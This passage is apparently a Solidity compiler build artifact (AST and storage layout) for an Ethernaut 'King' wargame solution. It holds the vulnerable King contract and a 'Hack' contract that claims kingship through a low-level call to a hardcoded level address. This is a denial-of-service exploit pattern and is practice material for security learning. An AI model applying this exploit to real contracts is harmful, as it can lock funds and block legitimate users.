						"storage": [
							{
								"astId": 3,
								"contract": "contracts/Ethernaut/09-King.sol:King",
								"label": "king",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							},
							{
								"astId": 5,
								"contract": "contracts/Ethernaut/09-King.sol:King",
								"label": "prize",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							},
							{
								"astId": 7,
								"contract": "contracts/Ethernaut/09-King.sol:King",
								"label": "owner",
								"offset": 0,
								"slot": "2",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "9302",
				"formattedMessage": "Warning: Return value of low-level calls not used.\n  --> contracts/Ethernaut/09-King.sol:31:9:\n   |\n31 |         king.call{value: msg.value}(\"\");\n   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n",
				"message": "Return value of low-level calls not used.",
				"severity": "warning",
				"sourceLocation": {
					"end": 668,
					"file": "contracts/Ethernaut/09-King.sol",
					"start": 637
				},
				"type": "Warning"
			}
		],
		"sources": {
			"contracts/Ethernaut/09-King.sol": {
				"ast": {
					"absolutePath": "contracts/Ethernaut/09-King.sol",
					"exportedSymbols": {
						"Hack": [
							88
						],
						"King": [
							70
						]
					},
					"id": 89,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "King",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 70,
							"linearizedBaseContracts": [
								70
							],
							"name": "King",
							"nameLocation": "68:4:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 3,
									"mutability": "mutable",
									"name": "king",
									"nameLocation": "88:4:0",
									"nodeType": "VariableDeclaration",
									"scope": 70,
									"src": "80:12:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 2,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "80:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"functionSelector": "e3ac5d26",
									"id": 5,
									"mutability": "mutable",
									"name": "prize",
									"nameLocation": "109:5:0",
									"nodeType": "VariableDeclaration",
									"scope": 70,
									"src": "97:17:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 4,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "97:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"functionSelector": "8da5cb5b",
									"id": 7,
									"mutability": "mutable",
									"name": "owner",
									"nameLocation": "134:5:0",
									"nodeType": "VariableDeclaration",
									"scope": 70,
									"src": "119:20:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 6,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "119:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "public"
								},
								{
									"body": {
										"id": 25,
										"nodeType": "Block",
										"src": "168:81:0",
										"statements": [
											{
												"expression": {
													"id": 13,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 10,
														"name": "owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 7,
														"src": "175:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"expression": {
															"id": 11,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 4294967281,
															"src": "183:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 12,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "187:6:0",
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"src": "183:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "175:18:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 14,
												"nodeType": "ExpressionStatement",
												"src": "175:18:0"
											},
											{
												"expression": {
													"id": 18,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 15,
														"name": "king",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 3,
														"src": "202:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"expression": {
															"id": 16,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 4294967281,
															"src": "209:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 17,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "213:6:0",
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"src": "209:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "202:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 19,
												"nodeType": "ExpressionStatement",
												"src": "202:17:0"
											},
											{
												"expression": {
													"id": 23,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 20,
														"name": "prize",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "226:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"expression": {
															"id": 21,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 4294967281,
															"src": "234:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 22,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "238:5:0",
														"memberName": "value",
														"nodeType": "MemberAccess",
														"src": "234:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "226:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 24,
												"nodeType": "ExpressionStatement",
												"src": "226:17:0"
											}
										]
									},
									"id": 26,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 8,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "157:2:0"
									},
									"returnParameters": {
										"id": 9,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "168:0:0"
									},
									"scope": 70,
									"src": "146:103:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 60,
										"nodeType": "Block",
										"src": "282:151:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 38,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 33,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"expression": {
																		"id": 30,
																		"name": "msg",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 4294967281,
																		"src": "297:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_message",
																			"typeString": "msg"
																		}
																	},
																	"id": 31,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberLocation": "301:5:0",
																	"memberName": "value",
																	"nodeType": "MemberAccess",
																	"src": "297:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">=",
																"rightExpression": {
																	"id": 32,
																	"name": "prize",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 5,
																	"src": "310:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "297:18:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "||",
															"rightExpression": {
																"commonType": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																},
																"id": 37,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"expression": {
																		"id": 34,
																		"name": "msg",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 4294967281,
																		"src": "319:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_message",
																			"typeString": "msg"
																		}
																	},
																	"id": 35,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberLocation": "323:6:0",
																	"memberName": "sender",
																	"nodeType": "MemberAccess",
																	"src": "319:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "==",
																"rightExpression": {
																	"id": 36,
																	"name": "owner",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 7,
																	"src": "333:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"src": "319:19:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "297:41:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 29,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "289:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 39,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "289:50:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 40,
												"nodeType": "ExpressionStatement",
												"src": "289:50:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"expression": {
																"id": 46,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967281,
																"src": "369:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 47,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberLocation": "373:5:0",
															"memberName": "value",
															"nodeType": "MemberAccess",
															"src": "369:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 43,
																	"name": "king",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "354:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 42,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "346:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_payable_$",
																	"typeString": "type(address payable)"
																},
																"typeName": {
																	"id": 41,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "346:8:0",
																	"stateMutability": "payable",
																	"typeDescriptions": {}
																}
															},
															"id": 44,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "346:13:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 45,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "360:8:0",
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"src": "346:22:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 48,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "346:33:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 49,
												"nodeType": "ExpressionStatement",
												"src": "346:33:0"
											},
											{
												"expression": {
													"id": 53,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 50,
														"name": "king",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 3,
														"src": "386:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"expression": {
															"id": 51,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 4294967281,
															"src": "393:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 52,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "397:6:0",
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"src": "393:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "386:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 54,
												"nodeType": "ExpressionStatement",
												"src": "386:17:0"
											},
											{
												"expression": {
													"id": 58,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 55,
														"name": "prize",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "410:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"expression": {
															"id": 56,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 4294967281,
															"src": "418:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 57,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "422:5:0",
														"memberName": "value",
														"nodeType": "MemberAccess",
														"src": "418:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "410:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 59,
												"nodeType": "ExpressionStatement",
												"src": "410:17:0"
											}
										]
									},
									"id": 61,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 27,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "262:2:0"
									},
									"returnParameters": {
										"id": 28,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "282:0:0"
									},
									"scope": 70,
									"src": "255:178:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 68,
										"nodeType": "Block",
										"src": "486:24:0",
										"statements": [
											{
												"expression": {
													"id": 66,
													"name": "king",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 3,
													"src": "500:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"functionReturnParameters": 65,
												"id": 67,
												"nodeType": "Return",
												"src": "493:11:0"
											}
										]
									},
									"functionSelector": "29cc6d6f",
									"id": 69,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_king",
									"nameLocation": "448:5:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 62,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "453:2:0"
									},
									"returnParameters": {
										"id": 65,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 64,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 69,
												"src": "477:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 63,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "477:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "476:9:0"
									},
									"scope": 70,
									"src": "439:71:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 89,
							"src": "59:454:0",
							"usedErrors": []
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "Hack",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 88,
							"linearizedBaseContracts": [
								88
							],
							"name": "Hack",
							"nameLocation": "526:4:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 86,
										"nodeType": "Block",
										"src": "558:118:0",
										"statements": [
											{
												"assignments": [
													74
												],
												"declarations": [
													{
														"constant": false,
														"id": 74,
														"mutability": "mutable",
														"name": "king",
														"nameLocation": "577:4:0",
														"nodeType": "VariableDeclaration",
														"scope": 86,
														"src": "569:12:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 73,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "569:7:0",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 76,
												"initialValue": {
													"hexValue": "307838363445373830344539636431373936663335346336376131393864373839343136643766393936",
													"id": 75,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "584:42:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													},
													"value": "0x864E7804E9cd1796f354c67a198d789416d7f996"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "569:57:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"hexValue": "",
															"id": 83,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "665:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															},
															"value": ""
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																	"typeString": "literal_string \"\""
																}
															],
															"expression": {
																"id": 77,
																"name": "king",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 74,
																"src": "637:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"id": 79,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberLocation": "642:4:0",
															"memberName": "call",
															"nodeType": "MemberAccess",
															"src": "637:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
															}
														},
														"id": 82,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"names": [
															"value"
														],
														"nodeType": "FunctionCallOptions",
														"options": [
															{
																"expression": {
																	"id": 80,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967281,
																	"src": "654:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 81,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberLocation": "658:5:0",
																"memberName": "value",
																"nodeType": "MemberAccess",
																"src": "654:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"src": "637:27:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 84,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "637:31:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"id": 85,
												"nodeType": "ExpressionStatement",
												"src": "637:31:0"
											}
										]
									},
									"id": 87,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 71,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "548:2:0"
									},
									"returnParameters": {
										"id": 72,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "558:0:0"
									},
									"scope": 88,
									"src": "537:139:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 89,
							"src": "517:162:0",
							"usedErrors": []
						}
					],
					"src": "32:647:0"
				},
				"id": 0
			}
		}
	}
}